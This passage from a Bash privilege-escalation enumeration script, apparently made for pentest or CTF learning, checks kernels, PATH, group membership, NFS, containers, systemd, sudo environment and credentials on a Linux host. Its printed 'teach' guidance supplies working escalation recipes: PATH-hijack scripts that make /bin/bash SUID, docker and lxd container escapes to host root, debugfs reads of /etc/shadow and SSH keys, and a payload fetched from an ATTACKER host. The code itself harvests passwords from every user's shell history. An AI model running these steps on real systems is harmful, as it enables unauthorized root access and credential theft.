        teach "  • Overlayfs (CVE-2015-1328) - Ubuntu specific"
        teach "  • perf_event (CVE-2013-2094) - Affects 3.4 - 3.13"
        teach "  • recvmsg (CVE-2014-0038) - Memory corruption"
        teach "  • futex (CVE-2014-3153) - Towelroot exploit"
        teach ""
        teach "HOW TO FIND EXPLOITS:"
        teach "  1. Check exact version: uname -r"
        teach "  2. Search exploit-db:"
        teach "     searchsploit linux kernel $kernel_version"
        teach "  3. Try automated tools:"
        teach "     https://github.com/mzet-/linux-exploit-suggester"
        teach "     ./linux-exploit-suggester.sh"
        teach "  4. Check specific CVE databases"
        teach ""
        teach "RECOMMENDATION:"
        teach "  Use exploit suggester tools - too many CVEs to check manually"
        log ""
    fi
    
    # === Kernel 2.x ===
    if [ "$major" -eq 2 ]; then
        critical "Kernel 2.x - PREHISTORIC kernel - trivial to exploit"
        vuln "Kernel from the stone age - run exploit suggester"
        log ""
        teach "This kernel is from the early 2000s. It predates most modern"
        teach "security features. Almost certainly has dozens of working exploits."
        teach "Use linux-exploit-suggester to find them all."
        log ""
    fi
    
    # === General guidance ===
    log ""
    teach "═══════════════════════════════════════════════════════════════"
    teach "KERNEL EXPLOITATION - GENERAL CONCEPTS"
    teach "═══════════════════════════════════════════════════════════════"
    teach ""
    teach "WHY KERNEL EXPLOITS ARE DIFFERENT:"
    teach ""
    teach "  User-space exploits (sudo, SUID, cron):"
    teach "  • Require specific misconfigurations"
    teach "  • Depend on what's installed"
    teach "  • Can be fixed by admin without reboot"
    teach "  • Different across systems"
    teach ""
    teach "  Kernel exploits:"
    teach "  • Work regardless of system configuration"
    teach "  • Same kernel = same vulnerability across distributions"
    teach "  • Bypass ALL security (SELinux, AppArmor, containers)"
    teach "  • Require reboot to patch (admins delay this)"
    teach "  • Escape containers (containers share host kernel)"
    teach ""
    teach "KERNEL EXPLOIT WORKFLOW:"
    teach ""
    teach "  1. IDENTIFY"
    teach "     • Check kernel version: uname -r"
    teach "     • Note the distribution: cat /etc/os-release"
    teach "     • Check architecture: uname -m"
    teach ""
    teach "  2. SEARCH"
    teach "     • exploit-db: searchsploit linux kernel [version]"
    teach "     • Google: 'linux kernel [version] exploit'"
    teach "     • Exploit suggester: linux-exploit-suggester.sh"
    teach "     • GitHub: Search for CVE numbers"
    teach ""
    teach "  3. DOWNLOAD"
    teach "     • wget/curl to download .c file"
    teach "     • Or git clone the repository"
    teach "     • Read the exploit code (understand what it does)"
    teach ""
    teach "  4. COMPILE"
    teach "     • Check if gcc/make available: which gcc"
    teach "     • Compile: gcc exploit.c -o exploit"
    teach "     • Some need specific flags (read exploit comments)"
    teach "     • If no compiler, compile on similar system and transfer"
    teach ""
    teach "  5. EXECUTE"
    teach "     • chmod +x exploit"
    teach "     • ./exploit"
    teach "     • Many exploits spawn root shell automatically"
    teach "     • Some require additional steps (read the output)"
    teach ""
    teach "TROUBLESHOOTING:"
    teach "  • Exploit doesn't compile:"
    teach "    - Check kernel headers: apt install linux-headers-\$(uname -r)"
    teach "    - Try on matching system and transfer binary"
    teach ""
    teach "  • Exploit crashes:"
    teach "    - Kernel exploits are often unstable"
    teach "    - Try different exploit for same CVE"
    teach "    - Check if kernel is slightly different version"
    teach ""
    teach "  • No root shell:"
    teach "    - Check if ASLR/SMEP/SMAP enabled (harder exploitation)"
    teach "    - Try a different exploit variant"
    teach ""
    teach "CONTAINERS AND KERNEL EXPLOITS:"
    teach "  • Containers (Docker, LXC) share the HOST kernel"
    teach "  • If host kernel is vulnerable, container can escape"
    teach "  • Kernel exploit in container = root on HOST"
    teach "  • This is why kernel patches are critical for containers"
    teach ""
    teach "RECOMMENDED TOOLS:"
    teach "  • linux-exploit-suggester:"
    teach "    https://github.com/mzet-/linux-exploit-suggester"
    teach "  • linux-exploit-suggester-2:"
    teach "    https://github.com/jondonas/linux-exploit-suggester-2"
    teach ""
    info "For comprehensive kernel exploit search, use the tools above"
    log ""
}
# === PATH HIJACKING OPPORTUNITIES ===
enum_path() {
    section "PATH HIJACKING OPPORTUNITIES"
    
    explain_concept "PATH Hijacking" \
        "Programs can call commands using relative paths (e.g., 'ls' instead of '/bin/ls'). The shell searches \$PATH directories in order. If you control an early PATH directory, you control what gets executed." \
        "Lazy coding + SUID binaries = exploitable. Admins write scripts that call 'cat' or 'whoami' without full paths. If that script is SUID or run by cron as root, and you can create a malicious binary earlier in PATH, you win." \
        "Steps:\n  1. Find writable directory in PATH\n  2. Identify SUID binary that calls relative commands\n  3. Create malicious version in writable PATH dir\n  4. Execute SUID binary"
    
    local current_path="$PATH"
    local has_issues=0
    
    info "Current PATH: $current_path"
    
    # First pass - check if there are any issues
    while IFS=: read -r dir; do
        [ -z "$dir" ] && continue
        if [ "$dir" = "." ]; then
            has_issues=1
            break
        fi
        if [ -d "$dir" ] && [ -w "$dir" ]; then
            has_issues=1
            break
        fi
    done <<< "$current_path"
    
    # Only show education if we found issues
    if [ $has_issues -eq 1 ]; then
        log ""
        teach "╔═══════════════════════════════════════════════════════════╗"
        teach "║  PATH HIJACKING - Understanding Command Resolution"
        teach "╚═══════════════════════════════════════════════════════════"
        teach ""
        teach "HOW SHELL FINDS COMMANDS:"
        teach "  You type: ls"
        teach "  Shell searches PATH left-to-right:"
        teach "  /usr/local/bin/ls → /usr/bin/ls → /bin/ls"
        teach "  First match wins, stops searching"
        teach ""
        teach "EXPLOITATION:"
        teach "  If writable directory comes before real binary:"
        teach "  PATH=/tmp:/usr/bin  ← /tmp writable, comes first"
        teach "  Create: /tmp/ls (malicious)"
        teach "  Victim runs 'ls' → executes /tmp/ls as root"
        teach ""
        teach "WHY SUID BINARIES MATTER:"
        teach "  Bad: system(\"ls\")     ← Searches PATH"
        teach "  Good: execve(\"/bin/ls\") ← Absolute path"
        teach ""
        teach "CURRENT DIRECTORY (.) IN PATH:"
        teach "  Extremely dangerous - ANY directory becomes executable"
        teach "  Admin: cd /tmp && sudo script.sh"
        teach "  Your /tmp/command executes as root"
        log ""
    fi
    
    # Enumerate and report issues
    local writable_count=0
    local has_current_dir=0
    
    while IFS=: read -r dir; do
        [ -z "$dir" ] && continue
        
        if [ "$dir" = "." ]; then
            critical "CURRENT DIRECTORY (.) IN PATH"
            has_current_dir=1
            log ""
            teach "EXPLOITATION:"
            teach "  $ cd /tmp"
            teach "  $ cat > ls << 'EOF'"
            teach "  #!/bin/bash"
            teach "  chmod u+s /bin/bash"
            teach "  /bin/ls \"\$@\"  # Call real ls"
            teach "  EOF"
            teach "  $ chmod +x ls"
            teach "  $ # Wait for root to run command calling 'ls'"
            teach "  $ /bin/bash -p  # Root shell"
            log ""
            writable_count=$((writable_count + 1))
            
        elif [ -d "$dir" ] && [ -w "$dir" ]; then
            critical "WRITABLE PATH directory: $dir"
            log ""
            teach "EXPLOITATION:"
            teach "  Create malicious binary matching common command:"
            teach "  $ cat > $dir/whoami << 'EOF'"
            teach "  #!/bin/bash"
            teach "  chmod u+s /bin/bash"
            teach "  /usr/bin/whoami \"\$@\""
            teach "  EOF"
            teach "  $ chmod +x $dir/whoami"
            teach ""
            teach "  Find targets:"
            teach "  find / -perm -4000 2>/dev/null | while read f; do"
            teach "    strings \"\$f\" | grep -v '/' | grep '^[a-z]\\+\$'"
            teach "  done | sort -u"
            log ""
            writable_count=$((writable_count + 1))
        fi
    done <<< "$current_path"
    
    if [ $writable_count -eq 0 ] && [ $has_current_dir -eq 0 ]; then
        ok "No writable directories in PATH"
    fi
}
# === SPECIAL GROUPS ===
enum_groups() {
    section "PRIVILEGED GROUP MEMBERSHIP"
    
    explain_concept "Special Groups" \
        "Certain Linux groups grant powerful capabilities. Membership in these groups can be equivalent to root access." \
        "Groups exist to delegate specific privileges. Docker group = control containers as root. Disk group = read any file. LXD group = create privileged containers. Admins add users for convenience, not realizing the security implications." \
        "Dangerous groups and exploitation:\n  • docker: Mount host filesystem in container\n  • lxd/lxc: Create privileged container\n  • disk: Direct disk access bypasses permissions\n  • video: Capture framebuffer screenshots\n  • sudo: Obvious, but check for NOPASSWD"
    
    local current_groups=$(groups)
    info "Your groups: $current_groups"
    
    # Check for docker group
    if echo "$current_groups" | grep -qw "docker"; then
        critical "DOCKER GROUP - Instant root: docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash"
        vuln "You are in the DOCKER group!"
        explain_concept "Docker Group Exploitation" \
            "Docker daemon runs as root. Docker group members can execute commands inside containers that run as root and can mount the host filesystem." \
            "This is by design - Docker needs root to manage containers. The security issue is that Docker group = root equivalent, but admins don't realize this when adding users." \
            "Exploitation:\n  docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash\n  This:\n    1. Mounts entire host filesystem to /mnt in container\n    2. chroot into /mnt (now you're in host filesystem)\n    3. Running as root inside container = root on host\n  Alternative: docker run -v /etc/shadow:/tmp/shadow alpine cat /tmp/shadow"
    fi
    
    # Check for lxd/lxc group
    if echo "$current_groups" | grep -qE "lxd|lxc"; then
        critical "LXD/LXC GROUP - Create privileged container for root access"
        vuln "You are in the LXD/LXC group!"
        explain_concept "LXD Group Exploitation" \
            "LXD manages Linux containers. Group members can create privileged containers with security.privileged=true, which disables most isolation." \
            "Similar to Docker - container management needs root. Privileged containers can access host resources directly, including mounting host filesystem with no restrictions." \
            "Exploitation:\n  lxc init ubuntu:18.04 privesc -c security.privileged=true\n  lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true\n  lxc start privesc\n  lxc exec privesc /bin/bash\n  cd /mnt/root/root"
        
        teach "Alternative method if no internet for image download:"
        teach "  1. Build minimal Alpine image on your machine"
        teach "  2. Transfer to target: python3 -m http.server (on attacker)"
        teach "  3. wget http://ATTACKER/alpine.tar.gz"
        teach "  4. lxc image import alpine.tar.gz --alias privesc"
        teach "  5. Follow exploitation steps above"
    fi
    
    # Check for disk group
    if echo "$current_groups" | grep -qw "disk"; then
        critical "DISK GROUP - Read any file: debugfs /dev/sda1"
        vuln "You are in the DISK group!"
        explain_concept "Disk Group Exploitation" \
            "Disk group grants direct access to block devices (/dev/sda, etc). This bypasses all filesystem permissions." \
            "The disk group exists for disk management utilities. Direct disk access means you can read raw disk sectors, bypassing Linux permission checks entirely." \
            "Exploitation:\n  debugfs /dev/sda1 (interactive disk editor)\n  debugfs: cat /etc/shadow\n  Or: dd if=/dev/sda of=/tmp/disk.img (copy entire disk)\n  Or: Use debugfs to read /root/.ssh/id_rsa"
    fi
    
    # Check for video group
    if echo "$current_groups" | grep -qw "video"; then
        warn "You are in the VIDEO group"
        teach "Video group can access framebuffer devices"
        teach "  Capture screenshots of root user sessions: cat /dev/fb0 > screenshot.raw"
        teach "  May reveal passwords being typed, sensitive information"
    fi
    
    # Check for adm group
    if echo "$current_groups" | grep -qw "adm"; then
        info "You are in the ADM group"
        teach "Adm group can read most log files in /var/log"
        teach "  Useful for password hunting, finding misconfigurations"
        teach "  Check auth.log, apache logs, application logs for secrets"
    fi
}

# === NFS EXPORTS ===
enum_nfs() {
    section "NFS EXPORT ANALYSIS"
    
    if [ ! -f /etc/exports ]; then
        ok "No NFS exports configured"
        return
    fi
    
    explain_concept "NFS no_root_squash" \
        "NFS (Network File System) shares directories over network. 'no_root_squash' means root on client = root on server." \
        "By default, NFS 'squashes' root UID to nobody for security. But 'no_root_squash' disables this. If you can mount the share, you can create files as root on the server." \
        "Exploitation:\n  1. Mount the NFS share: mount -t nfs server:/share /mnt\n  2. Create SUID binary: cp /bin/bash /mnt/bash; chmod +s /mnt/bash\n  3. On server, this bash is now SUID root\n  4. Execute: /share/bash -p"
    
    grep -v "^#" /etc/exports 2>/dev/null | grep -v "^$" | while read line; do
        info "NFS export: $line"
        
        if echo "$line" | grep -q "no_root_squash"; then
            critical "NFS no_root_squash - Mount from another machine as root"
            vuln "NFS export has 'no_root_squash': $line"
            teach "If you can access this from another machine as root, you gain root on this system"
        fi
        
        if echo "$line" | grep -qE "rw|no_all_squash"; then
            warn "NFS export is writable or doesn't squash all UIDs"
        fi
    done
}

# === CONTAINER ESCAPE ===
enum_container() {
    section "CONTAINER DETECTION & ESCAPE"
    
    explain_concept "Container Environments" \
        "Containers isolate processes but share the host kernel. Misconfigurations or vulnerabilities can allow escape to host." \
        "Containers use namespaces and cgroups for isolation. If privileged, mounted with host volumes, or on vulnerable Docker, you may escape. Containers are NOT VMs - same kernel as host." \
        "Common escape vectors:\n  • Privileged container (--privileged flag)\n  • Docker socket mounted inside\n  • Host filesystem mounted\n  • Kernel exploits (affects host)\n  • CAP_SYS_ADMIN capability\n  • Misconfigured cgroups\n  • Shared PID namespace"
    
    local in_container=0
    local container_type=""
    
    # Check if running in container
    if [ -f /.dockerenv ]; then
        in_container=1
        container_type="Docker"
        warn "Running inside a DOCKER container"
        
        # Check .dockerenv contents (sometimes contains info)
        if [ -s /.dockerenv ]; then
            info "/.dockerenv is not empty:"
            cat /.dockerenv 2>/dev/null
        fi
        
    elif [ -f /run/.containerenv ]; then
        in_container=1
        container_type="Podman"
        warn "Running inside a PODMAN container"
        
    elif grep -qa container=lxc /proc/1/environ 2>/dev/null; then
        in_container=1
        container_type="LXC"
        warn "Running inside an LXC container"
        
    elif [ -d /proc/vz ] && [ ! -d /proc/bc ]; then
        in_container=1
        container_type="OpenVZ"
        warn "Running inside OpenVZ container"
    fi
    
    if [ $in_container -eq 0 ]; then
        ok "Not in a detected container environment"
        return
    fi
    
    # Detailed container analysis
    info "Container type detected: $container_type"
    
    # === CHECK 1: Privileged Container ===
    info "Checking if container is privileged..."
    if ip link add dummy0 type dummy 2>/dev/null; then
        ip link delete dummy0 2>/dev/null
        critical "PRIVILEGED CONTAINER - Full host access possible"
        vuln "Container is PRIVILEGED!"
        explain_concept "Privileged Container Escape" \
            "Privileged containers have almost all capabilities and can access host devices." \
            "The --privileged flag disables most security features. It's used for nested Docker, device access, etc. But it allows mounting host filesystem and accessing host resources." \
            "Exploitation:\n  1. List host disks: fdisk -l\n  2. Mount host root: mkdir /mnt/host && mount /dev/sda1 /mnt/host\n  3. Chroot to host: chroot /mnt/host /bin/bash\n  4. Alternative: Access /dev/mem or /dev/kmem for direct memory access"
        
        teach "Privileged escape steps:"
        teach "  fdisk -l  # Find host disk (usually /dev/sda1 or /dev/vda1)"
        teach "  mkdir /mnt/host"
        teach "  mount /dev/sda1 /mnt/host"
        teach "  chroot /mnt/host /bin/bash"
        teach "  # You're now on the host as root"
    else
        ok "Container is NOT privileged (cannot create network interfaces)"
    fi
    
    # === CHECK 2: Capabilities ===
    info "Checking container capabilities..."
    if command -v capsh >/dev/null 2>&1; then
        local caps=$(capsh --print 2>/dev/null)
        echo "$caps" | grep "Current:" | log
        
        # Check for dangerous capabilities
        if echo "$caps" | grep -q "cap_sys_admin"; then
            critical "CAP_SYS_ADMIN in container - Mount host filesystem or load kernel modules"
            vuln "Container has CAP_SYS_ADMIN!"
            teach "With CAP_SYS_ADMIN you can:"
            teach "  • Mount host filesystems"
            teach "  • Manipulate namespaces"
            teach "  • Potentially escape container"
        fi
        
        if echo "$caps" | grep -q "cap_sys_ptrace"; then
            warn "CAP_SYS_PTRACE - Can debug host processes if PID namespace shared"
        fi
        
        if echo "$caps" | grep -q "cap_dac_override"; then
            warn "CAP_DAC_OVERRIDE - Can bypass file permissions on mounted volumes"
        fi
    else
        warn "capsh not available - install libcap2-bin to check capabilities"
    fi
    
    # === CHECK 3: Docker Socket ===
    if [ -S /var/run/docker.sock ]; then
        critical "Docker socket MOUNTED - Full container orchestration access"
        vuln "Docker socket is accessible inside container: /var/run/docker.sock"
        explain_concept "Docker Socket Exploitation" \
            "The Docker socket allows full control over the Docker daemon. If mounted inside a container, you can create new containers, access host filesystem, or escape." \
            "Developers mount docker.sock for 'Docker-in-Docker' scenarios or CI/CD. This gives container full control over all containers and the host." \
            "Exploitation:\n  1. Create privileged container: docker run -v /:/host -it alpine chroot /host /bin/bash\n  2. Or exec into existing container as root\n  3. Access host filesystem through new container"
        
        # Check if we can actually use it
        if command -v docker >/dev/null 2>&1; then
            if docker ps 2>/dev/null | grep -q "."; then
                critical "Docker socket is USABLE - Can create escape container"
                teach "Escape command:"
                teach "  docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/bash"
            fi
        else
            warn "Docker socket present but docker client not installed"
            teach "If you can install or upload docker binary, you can escape"
        fi
    fi
    
    # === CHECK 4: Seccomp Profile ===
    info "Checking seccomp profile..."
    if [ -f /proc/self/status ]; then
        local seccomp=$(grep Seccomp /proc/self/status 2>/dev/null | awk '{print $2}')
        case "$seccomp" in
            0)
                warn "Seccomp: DISABLED - No syscall filtering (dangerous for host)"
                teach "No seccomp means you can make any syscall"
                ;;
            1)
                ok "Seccomp: STRICT - Very restrictive"
                ;;
            2)
                info "Seccomp: FILTER - Default Docker profile active"
                ok "Standard syscall filtering in place"
                ;;
            *)
                info "Seccomp: UNKNOWN ($seccomp)"
                ;;
        esac
    fi
    
    # === CHECK 5: AppArmor/SELinux ===
    info "Checking container MAC (Mandatory Access Control)..."
    if [ -f /proc/self/attr/current ]; then
        local mac_profile=$(cat /proc/self/attr/current 2>/dev/null)
        if [ -n "$mac_profile" ] && [ "$mac_profile" != "unconfined" ]; then
            info "MAC profile: $mac_profile"
            ok "Container has MAC restrictions"
        else
            warn "MAC: unconfined - No AppArmor/SELinux restrictions"
            teach "Unconfined = easier to exploit misconfigurations"
        fi
    fi
    
    # === CHECK 6: PID Namespace ===
    info "Checking PID namespace isolation..."
    local host_pid_count=$(ps aux 2>/dev/null | wc -l)
    
    if [ $host_pid_count -gt 50 ]; then
        critical "PID namespace likely SHARED - Can see host processes"
        vuln "Can see $host_pid_count processes - likely host PID namespace"
        teach "Shared PID namespace means:"
        teach "  • You can see all host processes"
        teach "  • With CAP_SYS_PTRACE you can attach to them"
        teach "  • Look for sensitive processes: ps aux | grep -E 'ssh|su|sudo'"
    else
        ok "PID namespace appears isolated (only $host_pid_count processes visible)"
    fi
    
    # === CHECK 7: Cgroup Analysis ===
    info "Analyzing cgroup configuration..."
    if [ -f /proc/1/cgroup ]; then
        cat /proc/1/cgroup | while read line; do
            log "  $line"
        done
        
        # Check if cgroup is writable (release_agent exploit)
        if [ -w /sys/fs/cgroup ]; then
            critical "cgroup filesystem is WRITABLE - release_agent exploit possible"
            vuln "/sys/fs/cgroup is writable!"
            teach "Cgroup release_agent escape:"
            teach "  1. Write malicious script to host-accessible path"
            teach "  2. Configure release_agent to execute it"
            teach "  3. Trigger cgroup cleanup"
            teach "  PoC: https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/"
        fi
    fi
    
    # === CHECK 8: Mounted Filesystems ===
    info "Checking for suspicious mounts..."
    mount | grep -vE "^(proc|tmpfs|devpts|sysfs|cgroup)" | while read line; do
        log "  $line"
        
        # Check for host filesystem mounts
        if echo "$line" | grep -qE "on / type|on /host|on /mnt"; then
            warn "Potential host filesystem mount detected"
        fi
        
        # Check for writable host paths
        local mount_point=$(echo "$line" | awk '{print $3}')
        if [ -w "$mount_point" ] && [ "$mount_point" != "/tmp" ] && [ "$mount_point" != "/dev/shm" ]; then
            vuln "Writable mount from host: $mount_point"
            teach "Check if this is a host directory - you may be able to modify host files"
        fi
    done
    
    # === CHECK 9: Kernel Version ===
    info "Kernel version (shared with host): $(uname -r)"
    teach "Since containers share the host kernel, kernel exploits affect the host"
    teach "Check enum_kernel() section for kernel-specific exploits"
    
    # === CHECK 10: Network Mode ===
    info "Checking network mode..."
    if ip addr | grep -q "docker0\|eth0"; then
        info "Container has network access"
        
        # Check if can reach host
        local host_gateway=$(ip route | grep default | awk '{print $3}')
        if [ -n "$host_gateway" ]; then
            info "Host gateway: $host_gateway"
            teach "Scan host from container: nmap $host_gateway"
            teach "Host may have services only accessible from inside"
        fi
    fi
    
    if ip addr | grep -q "host"; then
        warn "Container might be using host networking (--net=host)"
        teach "Host networking = no network isolation"
    fi
    
    # === Summary ===
    log ""
    info "Container escape strategy summary:"
    teach "1. If privileged: Mount host disk and chroot"
    teach "2. If docker.sock: Create escape container"
    teach "3. If CAP_SYS_ADMIN: Mount host filesystem"
    teach "4. If shared PID + CAP_SYS_PTRACE: Inject into host process"
    teach "5. If writable cgroups: release_agent exploit"
    teach "6. Check for kernel exploits (affects host)"
    teach "7. If mounted host paths: Modify sensitive files (.ssh/authorized_keys)"
}

# === SYSTEMD ANALYSIS ===
enum_systemd() {
    section "SYSTEMD SERVICE ANALYSIS"
    
    explain_concept "Systemd Services" \
        "Systemd manages system services. Writable service files or misconfigured services running as root can be exploited." \
        "Systemd replaced init scripts. Services defined in .service files specify what runs, as which user, and when. If you can modify a service file that runs as root, you control what root executes on boot or service restart." \
        "Attack vectors:\n  • Writable .service file\n  • Service executes writable script\n  • Service uses relative paths\n  • Service has weak permissions"
    
    # Check for writable service files (must be actually writable, not just symlinks)
    find /etc/systemd/system /lib/systemd/system -name "*.service" -type f -writable 2>/dev/null | while read service; do
        # Double-check it's actually writable (not just a symlink artifact)
        if [ -w "$service" ] && [ ! -L "$service" ]; then
            critical "Writable systemd service: $service - Modify ExecStart for root execution"
            vuln "Writable systemd service: $service"
            teach "Modify this service to run your code as root on next start"
            teach "  Add: ExecStart=/bin/bash /tmp/evil.sh"
            teach "  Then: systemctl daemon-reload; systemctl restart \$(basename $service)"
        fi
    done
    
    # Check for services with writable executables
    find /etc/systemd/system /lib/systemd/system -name "*.service" 2>/dev/null | while read service; do
        grep "^ExecStart=" "$service" 2>/dev/null | while read line; do
            local exec_path=$(echo "$line" | sed 's/ExecStart=//' | awk '{print $1}')
            if [ -n "$exec_path" ] && [ -w "$exec_path" ]; then
                vuln "Service $service executes writable file: $exec_path"
            fi
        done
    done
}

# === ENVIRONMENT VARIABLES ===
enum_env() {
    section "ENVIRONMENT VARIABLE ANALYSIS"
    
    explain_concept "Environment Variables" \
        "Environment variables can influence program behavior. LD_PRELOAD, LD_LIBRARY_PATH, and PYTHONPATH can be exploited if preserved through sudo." \
        "Programs load libraries at runtime. LD_PRELOAD forces a library to load first. If sudo preserves this variable (env_keep+=LD_PRELOAD), you can inject code into any sudo command." \
        "Exploitation:\n  1. Create malicious library with init function\n  2. Compile: gcc -shared -fPIC -o evil.so evil.c\n  3. Set: export LD_PRELOAD=/tmp/evil.so\n  4. Run: sudo <any command>\n  5. Your library's code runs as root"
    
    # Check current environment
    if env | grep -i "LD_PRELOAD\|LD_LIBRARY_PATH" | grep -qv "^$"; then
        warn "LD_* variables are set in environment:"
        env | grep -i "LD_PRELOAD\|LD_LIBRARY_PATH"
    fi
    
    # Check if sudo preserves env
    if sudo -l 2>/dev/null | grep -q "env_keep.*LD_PRELOAD"; then
        critical "Sudo preserves LD_PRELOAD - Inject malicious library for instant root"
        vuln "Sudo preserves LD_PRELOAD!"
        teach "Create malicious shared library and execute with any sudo command"
    fi
    
    info "Sudo permissions detected:"
    echo "$sudo_output" | while read line; do
        log "  $line"
    done
    log ""
    
    if sudo -l 2>/dev/null | grep -q "env_keep.*LD_LIBRARY_PATH"; then
        vuln "Sudo preserves LD_LIBRARY_PATH!"
        teach "Similar to LD_PRELOAD but points to directory containing evil library"
    fi
}

# === PASSWORD & HASH HUNTING ===
enum_passwords() {
    section "PASSWORD & CREDENTIAL HUNTING"
    
    explain_concept "Credential Hunting" \
        "Passwords and keys are often stored insecurely in config files, scripts, history files, and environment variables." \
        "Developers hardcode credentials for convenience. Admins store passwords in scripts. Users type them in commands. All leave traces. Finding one password often leads to privilege escalation or lateral movement." \
        "Where to look:\n  • .bash_history, .zsh_history\n  • Config files: *.conf, *.config, *.ini\n  • Scripts: *.sh, *.py, *.pl\n  • Database dumps, backup files\n  • Environment variables\n  • /var/www, application configs"
    
    # Check history files
    for histfile in ~/.bash_history ~/.zsh_history ~/.mysql_history ~/.psql_history; do
        if [ -r "$histfile" ]; then
            if grep -iE "password|passwd|pwd|secret|token|key" "$histfile" 2>/dev/null | head -3 | grep -q "."; then
                warn "Found password-related entries in $histfile"
                grep -iE "password|passwd|pwd|secret" "$histfile" 2>/dev/null | head -3 | while read line; do
                    log "  $line"
                done
            fi
        fi
    done
    
    # Check common config locations
    info "Checking common credential locations..."
    
    local cred_locations=(
        "/var/www/html/wp-config.php"
        "/var/www/html/config.php"
        "/.env"
        "/opt/*/config*"
        "/home/*/.config/*"
    )
    
    for pattern in "${cred_locations[@]}"; do
        find $(dirname "$pattern") -name "$(basename "$pattern")" 2>/dev/null | head -5 | while read file; do
            if grep -iE "password|secret|key|token" "$file" 2>/dev/null | head -1 | grep -q "."; then
                warn "Credentials found in: $file"
            fi
        done
    done
    
    # Check for SSH keys
    find /home -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null | while read key; do
        if [ -r "$key" ]; then
            critical "Readable SSH private key: $key - Use for lateral movement"
            warn "Readable SSH private key: $key"
            teach "Try this key for SSH access: ssh -i $key user@target"
        fi
    done
    info "Checking command history for ALL users..."
    while IFS=: read -r username x uid x x homedir shell; do
        if [ $uid -ge 1000 ] && [ -d "$homedir" ]; then
            for histfile in .bash_history .zsh_history .python_history .mysql_history; do
                if [ -r "$homedir/$histfile" ]; then
                    if grep -iE "password|passwd|pwd|secret|token|key|curl.*-u|wget.*password" "$homedir/$histfile" 2>/dev/null | head -5 | grep -q "."; then
                        critical "User $username history contains passwords: $homedir/$histfile"
                        vuln "Command history with credentials for user: $username"
                        grep -iE "password|passwd|pwd|secret|token" "$homedir/$histfile" 2>/dev/null | head -3 | while read line; do
                            log "  $line"
                        done
                    fi
                fi
            done
        fi
    done < /etc/passwd
}
# ============================================
# Software Version Checking
# ============================================

enum_software_versions() {
    section "INSTALLED SOFTWARE VERSION ANALYSIS"
    
    explain_concept "Vulnerable Software Detection" \
        "Outdated software often contains known exploitable vulnerabilities. Identifying installed versions helps locate attack vectors." \
        "Package managers track installed software. CVE databases document version-specific vulnerabilities. Attackers search for services running old versions with public exploits. Common targets: Apache, nginx, PHP, Python libraries, database servers." \
        "Process:\n  1. List installed packages\n  2. Identify versions\n  3. Cross-reference with exploit-db or searchsploit\n  4. Focus on network-facing services first"
    
    info "Enumerating installed packages ( a moment)..."
    
    # Detect package manager
    if command -v dpkg >/dev/null 2>&1; then
        info "Using dpkg (Debian/Ubuntu system)"
        
        # Check for commonly exploitable packages
        local targets=("apache2" "nginx" "php" "mysql-server" "postgresql" "openssh-server" "sudo" "polkit" "vim" "python3" "ruby" "nodejs")
        
        for pkg in "${targets[@]}"; do
            local version=$(dpkg -l "$pkg" 2>/dev/null | grep "^ii" | awk '{print $3}')
            if [ -n "$version" ]; then
                info "  $pkg: $version"
                teach "  Search exploits: searchsploit $pkg $version"
            fi
        done
        
    elif command -v rpm >/dev/null 2>&1; then
        info "Using rpm (RHEL/CentOS system)"
        
        local targets=("httpd" "nginx" "php" "mysql-server" "postgresql-server" "openssh-server" "sudo" "polkit" "vim" "python3")
        
        for pkg in "${targets[@]}"; do
            local version=$(rpm -q "$pkg" 2>/dev/null | grep -v "not installed")
            if [ -n "$version" ]; then
                info "  $version"
                teach "  Search exploits: searchsploit $pkg"
            fi
        done
    fi
    
    # Check web server versions directly
    if command -v apache2 >/dev/null 2>&1; then
        local apache_ver=$(apache2 -v 2>/dev/null | head -1)
        warn "Apache detected: $apache_ver"
        teach "Check for known Apache vulnerabilities for this version"
    fi
    
    if command -v nginx >/dev/null 2>&1; then
        local nginx_ver=$(nginx -v 2>&1)
        warn "Nginx detected: $nginx_ver"
        teach "Check for known Nginx vulnerabilities for this version"
    fi
    
    # Check interpreters
    if command -v php >/dev/null 2>&1; then
        local php_ver=$(php -v 2>/dev/null | head -1)
        warn "PHP detected: $php_ver"
        teach "Check for PHP CVEs: https://www.cvedetails.com/vulnerability-list/vendor_id-74/product_id-128/PHP-PHP.html"
    fi
    
    # Check Python packages
    if command -v pip3 >/dev/null 2>&1; then
        info "Checking Python packages for known vulnerabilities..."
        teach "Run 'pip3 list --outdated' to see outdated packages"
        teach "Use 'safety check' to scan for known vulnerabilities"
    fi
}

# === INTERESTING FILES ===
enum_interesting_files() {
    section "INTERESTING FILE DISCOVERY"
    
    teach "Looking for unusual or interesting files that might contain flags, credentials, or other useful information..."
    
    # SUID/SGID files in unusual locations
    info "SUID/SGID files in non-standard locations:"
    find /home /tmp /var /opt -type f \( -perm -4000 -o -perm -2000 \) 2>/dev/null | head -10 | while read file; do
        warn "  $file"
    done
    
    # Recently modified files
    info "Recently modified files (last 24 hours) in sensitive locations:"
    find /etc /root -type f -mtime -1 2>/dev/null | head -10 | while read file; do
        log "  $file"
    done
    
    # Files with passwords in name
    info "Files with 'password' in name:"
    find / -name "*password*" -o -name "*passwd*" 2>/dev/null | head -10 | while read file; do
        [ -r "$file" ] && log "  $file"
    done
    
    # Backup files
    info "Backup files that might contain credentials:"
    find /var/backups /home -name "*.bak" -o -name "*.backup" -o -name "*~" 2>/dev/null | head -10 | while read file; do
        [ -r "$file" ] && log "  $file"
    done
}
# ============================================
# Enhanced Hidden File Search
# ============================================

enum_hidden_files() {
    section "HIDDEN FILES & DIRECTORIES"
    
    explain_concept "Hidden Files" \
        "Files/directories starting with '.' are hidden from normal 'ls' commands. Attackers use these to hide tools, backdoors, and persistence mechanisms." \
        "Unix convention: files starting with '.' don't appear in directory listings unless using 'ls -a'. This is a feature, not security, but attackers exploit it to hide malicious files in plain sight." \
        "Focus on:\n  • /tmp, /var/tmp, /dev/shm (temporary storage)\n  • User home directories\n  • Unusual locations like /, /opt, /usr"
    
    info "Searching for hidden files in sensitive locations..."
    
    # Check common hiding spots
    for dir in /tmp /var/tmp /dev/shm /opt /; do
        if [ -d "$dir" ]; then
            find "$dir" -maxdepth 2 -name ".*" -type f 2>/dev/null | while read hidden; do
                case "$(basename "$hidden")" in
